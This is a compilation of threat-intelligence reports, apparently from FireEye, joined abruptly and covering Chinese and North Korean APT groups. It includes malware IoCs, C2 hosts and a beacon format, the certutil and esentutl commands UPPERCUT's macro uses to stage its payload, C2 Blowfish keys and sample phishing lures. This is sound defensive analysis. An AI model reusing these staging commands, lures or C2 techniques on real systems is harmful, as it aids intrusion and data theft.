+00a95fb30be2d6271c491545f6c6a707	2014 09 17 Welcome Reception for Bob and Jason_invitation.doc	CVE-2012-0158
+4ab6bf7e6796bb930be2dd0141128d06	產諮會_Y103(2)委員會_從東協新興國家崛起(0825).doc	CVE-2012-0158
+Figure 4: Identified exploit documents for HIGHTIDE
+
+When the file is opened, it drops HIGHTIDE in the form of an executable file onto the infected system.
+
+RIPTIDE and HIGHTIDE differ on several points: executable file location, image base address, the User-Agent within the GET requests, and the format of the URI. The RIPTIDE exploit document drops its executable file into the C:\Documents and Settings\{user}\Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\ folder. All but one sample that we identified were written to this folder as word.exe. The one outlier was written as winword.exe.
+
+Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28.
+
+THREEBYTE Malware Family
+
+On Monday August 25, 2014 we observed a different spear phish email sent from lilywang823@gmail.com to a technology company located in Taiwan. This spear phish contained a malicious Word document that exploited CVE-2012-0158. The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11.
+
+Similar to the newly discovered HIGHTIDE samples documented above, this malicious document dropped a backdoor to C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe. This backdoor had the following properties:
+
+ 
+
+MD5	16e627dbe730488b1c3d448bfc9096e2
+Size	75776 bytes
+Complie Time	2014-08-25 01:22:20
+Import Hash	dcfaa2650d29ec1bd88e262d11d3236f
+This backdoor sent the following callback traffic to video[.]csmcpr[.]com:
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/threebyte-wireshark_rdmo.max-500x500.jpg
+Figure 5: THREEBYTE GET Request Beacon
+
+The THREEBYTE spear phishing incident (while not yet attributed) shared the following characteristics with the above HIGHTIDE campaign attributed to APT12:
+
+The THREEBYTE backdoor was compiled two days after the HIGHTIDE backdoors.
+Both the THREEBYTE and HIGHTIDE backdoors were used in attacks targeting organizations in Taiwan.
+Both the THREEBYTE and HIGHTIDE backdoors were written to the same filepath of C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe.
+APT12 has previously used the THREEBYTE backdoor.
+WATERSPOUT Malware Family
+
+On August 25, 2014, we observed another round of spear phishing emails targeting a high-technology company in Japan. Attached to this email was another malicious document that was designed to exploit CVE-2012-0158. This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe. The backdoor had the following properties:
+
+
+MD5	f9cfda6062a8ac9e332186a7ec0e706a
+Size	49152 bytes
+Complie Time	2014-08-25 02:10:11
+Import Hash	864cd776c24a3c653fd89899ca32fe0b
+The backdoor connects to a command and control server at icc[.]ignorelist[.]com.
+
+Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server.
+
+ 
+
+GET /<string>/<5 digit number>/<4 character string>.php?<first 3 characters of last string>_id=<43 character string>= HTTP/1.1
+Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
+Host: <C2 Location>
+Cache-Control: no-cache
+Figure 6: Sample GET request for WATERSPOUT backdoor
+
+Although there are no current infrastructure ties to link this backdoor to APT12, there are several data points that show a possible tie to the same actors:
+
+Same initial delivery method (spear phishing email) with a Microsoft Word Document exploiting CVE-2012-0158.
+
+Although these points do not definitively tie WATERSPOUT to APT12, they do indicate a possible connection between the WATERSPOUT campaign, the THREEBYTE campaign, and the HIGHTIDE campaign attributed to APT12.
+
+Conclusion
+
+FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset. These development efforts may have resulted in the emergence of the WATERSPOUT backdoor.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/12-timeline_fqkd.max-500x500.jpg
+Figure 7: Compile dates for all three malware families
+
+APT12’s adaptations to public disclosures lead FireEye to make several conclusions about this threat group:
+
+Though public disclosures resulted in APT12 adaptations, FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels. Similarly, the public disclosure of APT12’s intrusion at the New York Times also led to only a brief pause in the threat group’s activity and immediate changes in TTPs. The pause and retooling by APT12 was covered in the Mandiant 2014 M-Trends report. Currently, APT12 continues to target organizations and conduct cyber operations using its new tools. Most recently, FireEye observed HIGHTIDE at multiple Taiwan-based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan-based electronics company. We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders.
+Introduction
+In July 2018, FireEye devices detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector. APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities.
+
+In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor. This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently. Part of this blog post will discuss the updates and differences we have observed across multiple versions of this backdoor.
+
+Attack Overview
+The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails. Although the contents of the malicious documents are unreadable (see Figure 3), the Japanese titles are related to maritime, diplomatic, and North Korean issues. Table 1 shows the UPPERCUT indicators of compromise (IoCs).
+
+ 
+
+File Name	MD5	Size	C2
+自民党海洋総合戦略小委員会が政府に提言申し入れ.doc
+
+Government Recommendations from the Liberal Democratic Party’s Comprehensive Strategic Maritime Subcommittee
+
+4f83c01e8f7507d23c67ab085bf79e97	843022	
+eservake.jetos[.]com
+
+82.221.100.52
+
+151.106.53.147
+
+グテマラ大使講演会案内状.doc
+
+Invitation to Lecture by Guatemalan Ambassador
+
+f188936d2c8423cf064d6b8160769f21	
+720384
+
+ 
+
+eservake.jetos[.]com
+
+151.106.53.147
+
+153.92.210.208
+
+米国接近に揺れる北朝鮮内部.doc
+
+North Korean interior swayed by the approach of the United States
+
+cca227f70a64e1e7fcf5bccdc6cc25dd	733184	
+eservake.jetos[.]com
+
+153.92.210.208
+
+167.99.121.203
+
+Table 1: UPPERCUT IoCs
+
+For the North Korean lure, a news article with an identical title was readily available online. It’s also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese. The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018. Figure 1 shows the screenshot of the event page.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan1_miht.max-900x900.png
+Figure 1: Event Website for the Lecture of Guatemala Ambassador
+
+Figure 2 shows the macro function that displays the lure document. At the bottom of this function, we can see the readable text that matches the contact information found in Figure 1. Thus, people who would have an interest in Latin American issues may have been the targets of this campaign.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan2_nzqf.max-1000x1000.png
+Figure 2: Macro to display lure document
+
+The initial Word documents were password protected, likely in an effort to bypass detection. Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan3_gbok.max-1000x1000.png
+Figure 3: Lure document
+
+Figure 4 shows what happens when the malicious macro is executed.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan4_htar.max-1000x1000.png
+Figure 4: Macro to install UPPERCUT
+
+The execution workflow is as follows:
+
+1. The macro drops three PEM files, padre1.txt, padre2.txt, and padre3.txt, to the victim’s %TEMP% folder and then copies them from %TEMP% to the %AllUserProfile% folder.
+
+2. The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows):
+
+ 
+
+C:\Windows\System32\cmd.exe" /c certutil -decode C:\ProgramData\padre1.txt C:\ProgramData\\GUP.txt
+C:\Windows\System32\cmd.exe" /c certutil -decode C:\ProgramData\padre2.txt C:\ProgramData\\libcurl.txt
+C:\Windows\System32\cmd.exe" /c certutil -decode C:\ProgramData\padre3.txt C:\ProgramData\\3F2E3AB9
+3. The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows):
+
+ 
+
+C:\Windows\System32\esentutl.exe" /y C:\ProgramData\\GUP.txt /d C:\ProgramData\GUP.exe /o
+C:\Windows\System32\esentutl.exe" /y C:\ProgramData\\libcurl.txt /d C:\ProgramData\libcurl.dll /o
+The dropped files include the following:
+
+GUP.exe : GUP, a free (LGPL) Generic Updater. GUP is an open source binary used by Notepad++ for software updates. The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5.
+libcurl.dll: Malicious Loader DLL
+3F2E3AB9: Encrypted shellcode
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan5_lyqn.max-700x700.png
+Figure 5: Notepad++ signed updater
+
+4. The macro launches the legitimate executable GUP.exe.
+
+The executable sideloads the malicious DLL (libcurl.dll), which decrypts and runs shellcode (3F2E3AB9) located in the same folder.
+The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT. Before decoding the DLL, the shellcode uses an anti-debug technique based on ntdll_NtSetInformationThread which causes the thread to be detached from the debugger, as shown in Figure 6. The DLL is then loaded into memory and the randomly named exported function is called.
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan6_yloz.max-1000x1000.png
+Figure 6: Anti-debug technique used by shellcode
+
+5. The macro deletes the initially dropped .txt files using Windows esentutl.exe and changes the document text to an embedded message.
+
+The complete attack overview is shown in Figure 7.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan7_hvai.max-1000x1000.png
+Figure 7: Attack overview
+
+Several threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique.
+
+Evolution of UPPERCUT
+Figure 8 shows the timeline of updates for UPPERCUT. The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph. The compile time of loaders in the newer version(s) are not shown here since the timestamps are overwritten and filled with zeroes. We don’t have visibility into UPPERCUT 5.2.x series, but it’s possible that minor revisions were released every few months between December 2017 and May 2018.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan8_mymw.max-1000x1000.png
+Figure 8: Timeline of UPPERCUT updates
+
+Unlike previous versions, the exported function names are randomized in the latest version (Table 2).
+
+ 
+
+Encoded Payload	Decoded Payload	 	 	 
+MD5	Size	Import Hash	Exported Function	Version
+aa3f303c3319b14b4829fe2faa5999c1	322164	182ee99b4f0803628c30411b1faa9992	l7MF25T96n45qOGWX	5.3.2
+126067d634d94c45084cbe1d9873d895	330804	5f45532f947501cf024d84c36e3a19a1	hJvTJcdAU3mNkuvGGq7L	5.4.1
+fce54b4886cac5c61eda1e7605483ca3	345812	c1942a0ca397b627019dace26eca78d8	WcuH	5.4.1
+Table 2: Static characteristics of UPPERCUT
+
+Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server. The error code is the value returned by the GetLastError function and sent in the next beacon. This was likely included to help the attackers understand the problem if the backdoor is unable to receive a response (Figure 9). This Cookie header is a unique indicator that can be used for network-based detection.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan9_npkr.max-1000x1000.png
+Figure 9: Example of callback
+
+Earlier versions of UPPERCUT used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. However, in the latest version, the keys are hard-coded uniquely for each C2 address and use the C2’s calculated MD5 hash to determine which key to use, as shown in Figure 10.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan10_eaia.max-1000x1000.png
+Figure 10: Blowfish key generation
+
+For instance, Table 3 lists the hard-coded C2 addresses, their MD5 hash, and the corresponding Blowfish key in the decoded payload of 126067d634d94c45084cbe1d9873d895.
+
+ 
+
+C2	MD5	Blowfish Key
+hxxp[:]//151.106.53[.]147/VxQG	f613846eb5bed227ec1a5f8df7e678d0	bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d
+hxxp[:]//153.92.210[.]208/wBNh1	50c60f37922ff2ff8733aaeaa9802da5	fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577dd
+hxxp[:]//eservake.jetos[.]com/qIDj	c500dae1ca41236830b59f1467ee96c1	d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004a
+Default	Default	f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53
+Table 3: Example of Blowfish keys
+
+In this example, the MD5 hash of hxxp[:]//151.106.53[.]147/VxQG will be f613846eb5bed227ec1a5f8df7e678d0. When the malware interacts with this URL, bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d will be selected as a Blowfish key. If the MD5 hash of the URL does not match any of the listed hashes, then the default key f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53 will be used.
+
+Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication. Table 4 shows the parameters sent to C2 server from the backdoor in the newer versions. These are sent via POST request, as shown in Figure 9.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt10-japan-table4_dwtv.max-1200x1200.png
+Table 4: URL parameters
+
+Additionally, the command string is hashed using the same RGPH hashing algorithm as before. Two more commands, 0xD290626C85FB1CE3 and 0x409C7A89CFF0A727, are supported in the newer versions (Table 5).
+
+ 
+
+Commands	Description
+0x97A168D9697D40DD	Download and validate file (XXHash comparison) from C2 server
+0x7CF812296CCC68D5	Upload file to C2 server
+0x652CB1CEFF1C0A00	Load PE file
+0x27595F1F74B55278	Download, validate (XXHash comparison), execute file, and send output to C2 server
+0xD290626C85FB1CE3	Format the current timestamp
+0x409C7A89CFF0A727	Capture the desktop screenshot in PNG format and send it to C2
+None of the above	The received buffer is executed via cmd.exe and the output is then sent to the C2 server
+Table 5: Supported commands
+
+Conclusion
+
+While APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving. In the newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor’s network communications. This shows that APT10 is very capable of maintaining and updating their malware.
+
+To mitigate the threat, users are advised to disable Office macros in their settings and not to open documents from unknown sources. FireEye Multi-Vector Execution (MVX) engine is able to recognize and block this threat with the following detection names:
+
+APT.Backdoor.Win.UPPERCUT
+FE_APT_Backdoor_Win32_UPPERCUT
+APT9
+
+Suspected attribution: Based on available data, we assess that this is a freelancer group with some nation-state sponsorship, possibly China.
+
+Target sectors: Organizations headquartered in multiple countries and in industries such as health care and pharmaceuticals, construction and engineering, and aerospace and defense.
+
+Overview: APT9 engages in cyber operations where the goal is data theft, usually focusing on the data and projects that make a particular organization competitive within its field.
+
+Associated malware: SOGU, HOMEUNIX, PHOTO, FUNRUN, Gh0st, ZXSHEL
+
+Attack vectors: APT9 was historically very active in the pharmaceuticals and biotechnology industry. We have observed this actor use spearphishing, valid accounts, as well as remote services for Initial Access. On at least one occasion, Mandiant observed APT9 at two companies in the biotechnology industry and suspect that APT9 actors may have gained initial access to one of the companies by using a trusted relationship between the two companies. APT9 use a wide range of backdoors, including publicly available backdoors, as well as backdoors that are believed to be custom, but are used by multiple APT groups.
+
+APT8
+
+Suspected attribution: China
+
+Target sectors: A broad range of industries, including media and entertainment, construction and engineering, and aerospace and defense.
+
+Overview: APT8 engages in cyber operations where the goal is intellectual property theft, usually focusing on the data and projects that make an organization competitive within its field. We assess that this is a freelancer group located in China with some nation-state sponsorship. APT8 has targeted organizations headquartered in multiple countries, including the U.S., Germany, the U.K., India, and Japan.
+
+Associated malware: HASH, FLYZAP, GOLFPRO, SAFEPUTT
+
+Attack vectors: APT8 actors often use spear phishing email messages with malicious attachments or links, or it exploits vulnerable Internet-facing web servers to compromise target organizations. In addition, in multiple intrusions APT8 actors sent malicious links to potential victims via chat or instant messaging programs.
+
+APT7
+
+Suspected attribution: China
+
+Target sectors: Construction, engineering, aerospace, and defense industrial base.
+
+Overview: APT7 engages in cyber operations where the goal is intellectual property theft, usually focusing on data and projects that make an organization competitive within its field. This group is known to have targeted organizations headquartered in the U.S. and U.K.
+
+Associated malware: DIGDUG, TRACKS
+
+Attack vectors: APT7 threat actors have used access to one organization to infiltrate another organization under the same corporate parent. This is a form of lateral movement, but in this case was also the initial compromise method for the second organization.
+
+APT6
+
+Suspected attribution: China
+
+Target sectors: Transportation, Automotive, Construction and Engineering, Telecommunications, Electronic, Construction and Materials.
+
+Overview: APT6 engages in cyber operations where the goal is data theft, most likely data and projects that make an organization competitive within its field. APT6 targeted organizations headquartered in the U.S and U.K.
+
+Associated malware: BELUGA, EXCHAIN, PUPTENT
+
+Attack vectors: APT6 utilizes several custom backdoors, including some used by other APT groups as well as those that are unique to the group.
+
+APT5
+
+Suspected attribution: China
+
+Target sectors: Regional telecommunication providers, Asia-based employees of global telecommunications and tech firms, high-tech manufacturing, and military application technology in the U.S., Europe, and Asia.
+
+Overview: APT5 has been active since at least 2007. APT5 has targeted or breached organizations across multiple industries, but its focus appears to be on telecommunications and technology companies, especially information about satellite communications. As early as 2014, Mandiant Incident Response discovered APT5 making unauthorized code modifications to files in the embedded operating system of another technology platform. In 2015, APT5 compromised a U.S. telecommunications organization providing services and technologies for private and government entities. During this intrusion, the actors downloaded and modified some of the router images related to the company’s network routers. Also during this time, APT5 stole files related to military technology from a South Asian defense organization. Observed filenames suggest the actors were interested in product specifications, emails concerning technical products, procurement bids and proposals, and documents on unmanned aerial vehicles (UAVs).
+
+Associated malware: BRIGHTCREST, SWEETCOLA, SPIRITBOX, PALEJAB, WIDERIM, WINVAULT, HAPPYSAD, BIRDWORLD, FARCRY, CYFREE, FULLSILO, HELLOTHEWORLD, HAZELNUT, GIF89A, SCREENBIND, SHINYFUR, TRUCKBED, LEOUNCIA, FREESWIM, PULLTAB, HIREDHELP, NEDDYHORSE, PITCHFORK, BRIGHTCOMB, ENCORE, TABCTENG, SHORTLEASH, CLEANACT, BRIGHTCYAN, DANCEPARTY, HALFBACK, PUSHBACK, COOLWHIP, LOWBID, TIGHTROPE, DIRTYWORD, AURIGA, KEYFANG, Poison Ivy
+
+Attack vectors: It appears to be a large threat group that consists of several subgroups, often with distinct tactics and infrastructure. The group uses malware with keylogging capabilities to specifically target telecommunication companies' corporate networks, employees and executives. APT5 has shown significant interest in compromising networking devices and manipulating the underlying software that supports these appliances.
+
+APT4
+
+Description:
+Also known as: Maverick Panda, Sykipot Group, Wisp
+
+Suspected attribution: China
+
+Target sectors: Aerospace and Defense, Industrial Engineering, Electronics, Automotive, Government, Telecommunications, and Transportation.
+
+Overview: APT4 appears to target the Defense Industrial Base (DIB) at a higher rate of frequency than other commercial organizations. However, APT4's history of targeted intrusions is wide in scope.
+
+Associated malware: GETKYS, LIFESAVER, CCHIP, SHYLILT, SWEETTOOTH, PHOTO, SOGO
+
+Attack vectors: APT4 actors often leverage spear phishing messages using U.S. government, Department of Defense, or defense industrial base themes. APT4 actors may repurpose valid content from government or U.S. DoD web sites within their message bodies to lend them legitimacy.
+
+APT2
+
+Suspected attribution: China
+
+Target sectors: Military and Aerospace.
+
+Overview: This group was first observed in 2010. APT2 engages in cyber operations where the goal is intellectual property theft, usually focusing on the data and projects that make an organization competitive within its field
+
+Associated malware: MOOSE, WARP
+
+Attack vectors: Spearphishing emails that exploit CVE-2012-0158.
+
+APT1
+
+Also known as: Unit 61398, Comment Crew
+Suspected attribution: China’s People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department (总参三部二局), which is most commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398 (61398部队).
+
+Target sectors: Information Technology, Aerospace, Public Administration, Satellites and Telecommunications, Scientific Research and Consulting, Energy, Transportation, Construction and Manufacturing, Engineering Services, High-tech Electronics, International Organizations, Legal Services Media, Advertising and Entertainment, Navigation, Chemicals, Financial Services, Food and Agriculture, Healthcare, Metals and Mining, Education
+
+Overview: APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has demonstrated the capability and intent to steal from dozens of organizations simultaneously. The group focuses on compromising organizations across a broad range of industries in English-speaking countries. The size of APT1’s infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators.
+
+Associated malware: TROJAN.ECLTYS, BACKDOOR.BARKIOFORK, BACKDOOR.WAKEMINAP, TROJAN.DOWNBOT, BACKDOOR.DALBOT, BACKDOOR.REVIRD, TROJAN.BADNAME, BACKDOOR.WUALESS
+
+Attack vectors: The most commonly observed method of initial compromise is spear phishing. The spear phishing emails contain either a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are usually relevant to the recipient. APT1 also creates webmail accounts using real peoples’ names. While APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast majority of the time they use what appear to be their own custom backdoors. Throughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can use. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been present for more than a few weeks.
+The FireEye as a Service team detected independent phishing campaigns conducted by two Chinese advanced persistent threat (APT) groups that we track, APT3 and APT18. Each threat group quickly took advantage of a zero-day vulnerability (CVE-2015-5119), which was leaked in the disclosure of Hacking Team’s internal data. Adobe released a patch for the vulnerability on July 8, 2015. Before that patch was released, the groups launched phishing campaigns against multiple companies in the aerospace and defense, construction and engineering, education, energy, health and biotechnology, high tech, non-profit, telecommunications, and transportation industries.
+ 
+As of publication, we have no reason to believe APT3 and APT18 are working together. Their opportunism demonstrates each group’s flexibility, organization, and awareness of developments in the information security community.
+APT3’s Campaign
+APT3 actors targeted at least 10 organizations in the following industries:
+
+Aerospace and Defense
+Construction and Engineering
+Energy
+High Tech
+Non-Profit
+Telecommunications
+Transportation
+An example of an APT3 phishing email is below in Figure 1:
+
+FROM: "<first.last>" <first.last>@perrydale.com
+
+SUBJECT:  <Target> Analysis report- 2015
+
+URLs:
+
+hxxp://report.perrydale[.]com/ema/RR201507[.]pdf
+
+hxxp://vic.perrydale[.]com/logo2.jpg
+
+hxxp://rpt.perrydale[.]com/en/rep201507101[.]pdf
+
+Figure 1: An example of APT3 phishing email using CVE-2015-5119
+
+As of July 8, all three domains observed in the URLs resolved to 194.44.130.179. Similar to APT3’s activity in Operation Clandestine Wolf, the URLs redirect to JavaScript profilers and a malicious Adobe Flash file. The Flash file downloads an obfuscated GIF, which contains a SHOTPUT payload compiled the day APT3 sent the phishing emails. SHOTPUT is a DLL backdoor that that communicates over HTTP and may be capable of uploading or downloading files, managing processes, executing system commands, and collecting system information. SHOTPUT may also be detected as Backdoor.APT.CookieCutter. The SHOTPUT backdoor communicates to the following command and control (CnC) addresses, which are hardcoded into the malware:
+
+psa.perrydale[.]com
+link.angellroofing[.]com
+107.20.255.57
+23.99.20.198
+This is the third time since mid-2014 that we have observed APT3 using a zero-day, which attests to its ability to capitalize on new exploits.
+
+APT18’s Campaign
+APT18 actors targeted at least 13 organizations in the following industries:
+
+Aerospace and Defense
+Construction and Engineering
+Education
+Health and Biotechnology
+High Tech
+Telecommunications
+Transportation
+An example of an APT18 phishing email is shown in Figure 2:
+
+FROM:  <various> @duwrt.com
+
+SUBJECT: Important:Flash Update
+
+Body:
+
+Dear,
+
+If you already have Flash installed on your computer, you'll be asked to download and install update. Once the new update is installed, Flash should function normally. Update Outlook Many Flash problems can be solved by updating your client software to the latest version. Please verify that you have all the latest updates available for your version of Adobe flash software. Here's how:
+
+1.Download update hxxp://get[.]adobe[.]com/ (masked URL: hxxp://137.175.4[.]132/index.htm)
+
+2.Click Check for Updates.
+
+3.Restart your computer after you have verified that all updates are installed. You must have administrative privileges on your computer to install any Flash. Please contact your desktop support staff if you need assistance.
+
+Figure 2: An example of APT18 phishing email using CVE-2015-5119
+
+Once the victim clicks the URL, the system downloads a malicious Adobe Flash (.swf) file with the properties shown in Figure 3.
+
+Filename: movie.swf
+
+MD5: 079a440bee0f86d8a59ebc5c4b523a07
+
+Filesize: 214976
+
+Figure 3: APT18 Malicious SWF Properties
+
+Upon exploitation, a GH0ST RAT variant is delivered to the victims’ system, which calls out to a previously known APT18 CnC address 223.25.233.248. GH0ST RAT is a backdoor derived from public source code. It may also be detected as Backdoor.APT.Gh0stRat. The compiled source code provides attackers with many ways to control a victim’s system, including the ability to create, manipulate, delete, launch, or transfer files; perform screen or audio capture; enable a webcam; list or kill processes; open a command shell; and wipe event logs. However, since the source code is public, threat groups may tailor the code by removing or adding functionality.
+
+Comparing the Campaigns
+APT3 and APT18 took a slightly different approach in employing the exploit, which demonstrates they likely work independently. As usual, APT3 used compromised infrastructure, while APT18 relied on procured infrastructure. APT3 used customized phishing emails that sometimes contained the names of the targeted organizations, whereas APT18’s emails were nonspecific and likely crafted to be used on multiple targets.
+
+Quick Turnaround Time Demonstrates Adaptability and Opportunism
+The groups demonstrated their adaptability and skill by quickly employing Hacking Team’s leaked zero-day before the vulnerability was patched. Both groups likely monitor information from security research to learn what exploits are available and how network defenders are reacting to them. We have previously observed APT3 monitoring and quickly changing tactics based on public research. After we exposed details about Operation Clandestine Wolf, APT3 changed its phishing emails, modified filenames, and updated its backdoor.
+
+In the past, APT3 and APT18 have frequently developed or adapted zero-day exploits for operations, which were likely planned in advance. Using data from the Hacking Team leak demonstrates how they can shift resources—selecting targets, preparing infrastructure, crafting messages, and updating tools—to take advantage of unexpected opportunities like newly exposed exploits.
+
+Recommendations
+FireEye maintains endpoint and network detection for CVE-2015-5119, the backdoors used in these campaigns, and other tools used by these groups. Additionally, we highly recommend:
+
+Applying Adobe’s patch for Flash immediately,
+Querying for additional activity by source addresses or email indicators,
+Blocking CnC addresses via outbound communications, and
+Scope the environment to prepare for incident response.
+Today, we are releasing details on a advanced persistent threat group that we believe is responsible for conducting financial crime on behalf of the North Korean regime, stealing millions of dollars from banks worldwide. The group is particularly aggressive; they regularly use destructive malware to render victim networks inoperable following theft. More importantly, diplomatic efforts, including the recent Department of Justice (DOJ) complaint that outlined attribution to North Korea, have thus far failed to put an end to their activity. We are calling this group APT38.
+
+We are releasing a special report, APT38: Un-usual Suspects, to expose the methods used by this active and serious threat, and to complement earlier efforts by others to expose these operations, using FireEye’s unique insight into the attacker lifecycle.
+
+We believe APT38’s financial motivation, unique toolset, and tactics, techniques and procedures (TTPs) observed during their carefully executed operations are distinct enough to be tracked separately from other North Korean cyber activity. There are many overlapping characteristics with other operations, known as “Lazarus” and the actor we call TEMP.Hermit; however, we believe separating this group will provide defenders with a more focused understanding of the adversary and allow them to prioritize resources and enable defense. The following are some of the ways APT38 is different from other North Korean actors, and some of the ways they are similar:
+
+We find there are clear distinctions between APT38 activity and the activity of other North Korean actors, including the actor we call TEMP.Hermit. Our investigation indicates they are disparate operations against different targets and reliance on distinct TTPs; however, the malware tools being used either overlap or exhibit shared characteristics, indicating a shared developer or access to the same code repositories. As evident in the DOJ complaint, there are other shared resources, such as personnel who may be assisting multiple efforts.
+A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment. This report detailed malware and TTPs related to a set of developers and operators they dubbed “Lazarus,” a name that has become synonymous with aggressive North Korean cyber operations.
+Since then, public reporting attributed additional activity to the “Lazarus” group with varying levels of confidence primarily based on malware similarities being leveraged in identified operations. Over time, these malware similarities diverged, as did targeting, intended outcomes and TTPs, almost certainly indicating that this activity is made up of multiple operational groups primarily linked together with shared malware development resources and North Korean state sponsorship.
+Since at least 2014, APT38 has conducted operations in more than 16 organizations in at least 13 countries, sometimes simultaneously, indicating that the group is a large, prolific operation with extensive resources. The following are some details about APT38 targeting:
+
+The total number of organizations targeted by APT38 may be even higher when considering the probable low incident reporting rate from affected organizations.
+APT38 is characterized by long planning, extended periods of access to compromised victim environments preceding any attempts to steal money, fluency across mixed operating system environments, the use of custom developed tools, and a constant effort to thwart investigations capped with a willingness to completely destroy compromised machines afterwards.
+The group is careful, calculated, and has demonstrated a desire to maintain access to a victim environment for as long as necessary to understand the network layout, required permissions, and system technologies to achieve its goals.
+On average, we have observed APT38 remain within a victim network for approximately 155 days, with the longest time within a compromised environment believed to be almost two years.
+In just the publicly reported heists alone, APT38 has attempted to steal over $1.1 billion dollars from financial institutions.
+Investigating intrusions of many victimized organizations has provided us with a unique perspective into APT38’s entire attack lifecycle. Figure 1 contains a breakdown of observed malware families used by APT38 during the different stages of their operations. At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:
+
+Information Gathering: Conducted research into an organization’s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions. At no point did we observe these actors breach the integrity of the SWIFT system itself.).
+Initial Compromise: Relied on watering holes and exploited an insecure out-of-date version of Apache Struts2 to execute code on a system.
+Internal Reconnaissance: Deployed malware to gather credentials, mapped the victim’s network topology, and used tools already present in the victim environment to scan systems.
+Pivot to Victim Servers Used for SWIFT Transactions: Installed reconnaissance malware and internal network monitoring tools on systems used for SWIFT to further understand how they are configured and being used. Deployed both active and passive backdoors on these systems to access segmented internal systems at a victim organization and avoid detection.
+Transfer funds: Deployed and executed malware to insert fraudulent SWIFT transactions and alter transaction history. Transferred funds via multiple transactions to accounts set up in other banks, usually located in separate countries to enable money laundering.
+Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis.
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt38lifecycle_qgsb.max-1800x1800.png
